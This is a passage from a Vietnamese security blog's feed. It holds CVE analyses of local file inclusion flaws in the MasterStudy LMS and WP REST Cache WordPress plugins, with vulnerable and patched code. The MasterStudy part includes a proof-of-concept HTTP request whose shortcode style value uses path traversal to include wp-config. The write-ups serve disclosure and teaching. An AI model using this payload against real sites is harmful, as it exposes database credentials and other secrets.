1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public static function stm_lms_load_vc_element( $__template, $__vars = array(), $__template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    extract( $__vars ); // phpcs:ignore WordPress.PHP.DontExtract&#xA;    $element = self::stm_lms_locate_vc_element( $__template, $__template_name, $custom_path );&#xA;    if ( ! file_exists( $element ) &amp;amp;&amp;amp; strpos( $__template_name, &amp;#39;style_&amp;#39; ) !== false ) {&#xA;        $element = str_replace( $__template_name, &amp;#39;style_1&amp;#39;, $element );&#xA;    }&#xA;    if ( file_exists( $element ) ) {&#xA;        include $element;&#xA;    } else {&#xA;        echo esc_html__( &amp;#39;Element not found in&amp;#39;, &amp;#39;masterstudy-lms-learning-management-system&amp;#39; );&#xA;        echo esc_html( &amp;#39; &amp;#39; . $element );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;include()&lt;/code&gt; tại đây dùng biến &lt;code&gt;$element&lt;/code&gt; do &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; trả về và &lt;code&gt;$__template_name&lt;/code&gt; (tức giá trị &lt;code&gt;style&lt;/code&gt; từ shortcode) ảnh hưởng trực tiếp tới kết quả đó. Nếu &lt;code&gt;style&lt;/code&gt; không được xác thực, attacker có thể ép &lt;code&gt;include&lt;/code&gt; file tùy ý dẫn đến LFI.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function stm_lms_locate_vc_element( $templates, $template_name = &amp;#39;&amp;#39;, $custom_path = &amp;#39;&amp;#39; ) {&#xA;    $located = false;&#xA;&#xA;    foreach ( (array) $templates as $template ) {&#xA;&#xA;        $folder = $template;&#xA;&#xA;        if ( ! empty( $template_name ) ) {&#xA;            $template = $template_name;&#xA;        }&#xA;&#xA;        if ( substr( $template, -4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;            $template .= &amp;#39;.php&amp;#39;;&#xA;        }&#xA;&#xA;        if ( empty( $custom_path ) ) {&#xA;            $located = locate_template( &amp;#39;partials/vc_parts/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/includes/shortcodes/partials/&amp;#39; . $folder . &amp;#39;/&amp;#39; . $template;&#xA;            }&#xA;        } else {&#xA;            $located = locate_template( $custom_path );&#xA;            if ( ! ( $located ) ) {&#xA;                $located = STM_LMS_PATH . &amp;#39;/&amp;#39; . $custom_path . &amp;#39;.php&amp;#39;;&#xA;            }&#xA;        }&#xA;&#xA;        if ( file_exists( $template_name ) ) {&#xA;            break;&#xA;        }&#xA;    }&#xA;&#xA;    return apply_filters( &amp;#39;stm_lms_locate_vc_element&amp;#39;, $located, $templates );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; có nhiệm vụ xác định và trả về đường dẫn file template (&lt;code&gt;.php&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;Nếu có &lt;code&gt;$template_name&lt;/code&gt;, nó sẽ &lt;strong&gt;ghi đè tên template mặc định&lt;/strong&gt; và đảm bảo tên file có phần mở rộng &lt;code&gt;.php&lt;/code&gt;. Tên file sẽ là&lt;code&gt;STM_LMS_PATH/includes/shortcodes/partials/{folder}/{template}.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ví dụ với &lt;code&gt;style=payload&lt;/code&gt; thì &lt;code&gt;stm_lms_locate_vc_element()&lt;/code&gt; sẽ trả về:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/srv/www/wordpress/wp-content/plugins/masterstudy-lms-learning-management-system/_core/includes/shortcodes/partials/courses_categories/payload.php&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Tạo post với shortcode có attribute &lt;code&gt;style&lt;/code&gt; chứa LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/260?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;&#xA;{&amp;#34;id&amp;#34;:260,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:shortcode --&amp;gt;\n[stm_lms_courses_categories taxonomy=x style=../../../../../../../../wp-config]\n&amp;lt;!-- /wp:shortcode --&amp;gt;\n\n&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Kết quả&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger đã nhảy đến &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-21-cve-2025-32141/result.png&#34;&#xA;    alt=&#34;Kết quả LFI thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 3.5.28&lt;/strong&gt; của MasterStudy LMS cho phép LFI qua tham số &lt;code&gt;style&lt;/code&gt; trong shortcode do không kiểm tra đầu vào trước khi &lt;code&gt;include&lt;/code&gt; file. Bản vá &lt;strong&gt;3.5.29&lt;/strong&gt; đã làm sạch giá trị này bằng &lt;code&gt;sanitize_file_name()&lt;/code&gt; và &lt;code&gt;basename()&lt;/code&gt;, ngăn chặn việc truy cập file ngoài ý muốn.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ ghép trực tiếp input người dùng vào đường dẫn file.&lt;/li&gt;&#xA;&lt;li&gt;Luôn sanitize hoặc giới hạn giá trị bằng whitelist trước khi &lt;code&gt;include&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Xác thực đường dẫn thực tế để đảm bảo file nằm trong thư mục hợp lệ.&lt;/li&gt;&#xA;&lt;li&gt;Cập nhật lên &lt;strong&gt;v3.5.29&lt;/strong&gt; để loại bỏ lỗ hổng LFI.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/masterstudy-lms-learning-management-system/vulnerability/wordpress-masterstudy-lms-plugin-3-5-23-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress MasterStudy LMS Plugin &amp;lt;= 3.5.28 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-52716 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-20-cve-2025-52716/</link>
      <pubDate>Mon, 20 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-20-cve-2025-52716/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-20-cve-2025-52716/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;WP REST Cache&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 2025.1.0&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-52716&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-52716&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 2025.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 2025.1.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/wp-rest-cache/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP REST Cache Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;WP REST Cache&lt;/strong&gt;: &lt;strong&gt;2025.1.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;2025.1.1&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, &lt;code&gt;$sub&lt;/code&gt; là giá trị trả về của &lt;a href=&#34;https://www.php.net/manual/en/function.filter-input.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;filter_input()&lt;/code&gt;&lt;/a&gt; lấy giá trị từ tham số GET (&lt;code&gt;?sub=...&lt;/code&gt;) trong URL với filter &lt;a href=&#34;https://www.w3schools.com/php/filter_sanitize_special_chars.asp&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;FILTER_SANITIZE_FULL_SPECIAL_CHARS&lt;/code&gt;&lt;/a&gt; dùng để esacape &lt;code&gt;&amp;quot;&amp;lt;&amp;gt;&amp;amp;&lt;/code&gt; và các ký tự với ASCII value dưới 32. Tức không bao gồm &lt;code&gt;.(46)&lt;/code&gt; và &lt;code&gt;/(47)&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$sub&lt;/code&gt; được concat vào chuỗi có &lt;code&gt;&#39;.php&#39;&lt;/code&gt; sau cùng trước khi được &lt;code&gt;include_once&lt;/code&gt; mà không có cơ chế bảo vệ trước &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function settings_page() {&#xA;    $this-&amp;gt;settings_panels = apply_filters( &amp;#39;wp_rest_cache/settings_panels&amp;#39;, $this-&amp;gt;settings_panels );&#xA;&#xA;    $sub = filter_input( INPUT_GET, &amp;#39;sub&amp;#39;, FILTER_SANITIZE_FULL_SPECIAL_CHARS );&#xA;    if ( empty( $sub ) ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    $potential_sub_file = __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    if ( dirname( $potential_sub_file ) !== __DIR__ . &amp;#39;/partials&amp;#39; ) {&#xA;        $sub = &amp;#39;settings&amp;#39;;&#xA;    }&#xA;&#xA;    include_once __DIR__ . &amp;#39;/partials/header.php&amp;#39;;&#xA;    if ( isset( $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;] ) ) {&#xA;        include_once $this-&amp;gt;settings_panels[ $sub ][&amp;#39;template&amp;#39;];&#xA;    } elseif ( file_exists( __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39; ) ) {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-&amp;#39; . $sub . &amp;#39;.php&amp;#39;;&#xA;    } else {&#xA;        include_once __DIR__ . &amp;#39;/partials/sub-settings.php&amp;#39;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã thêm cơ chế &lt;strong&gt;kiểm tra vị trí file trước khi include&lt;/strong&gt;, đảm bảo file được nạp chỉ nằm trong thư mục &lt;code&gt;partials&lt;/code&gt;. Nếu phát hiện đường dẫn ra ngoài (do chuỗi như &lt;code&gt;../&lt;/code&gt;), plugin tự động chuyển về file mặc định an toàn. Nhờ đó, lỗ hổng &lt;strong&gt;LFI&lt;/strong&gt; bị loại bỏ.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;settings_page()&lt;/code&gt; được đăng ký làm callback của submenu&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_submenu_page(&#xA;    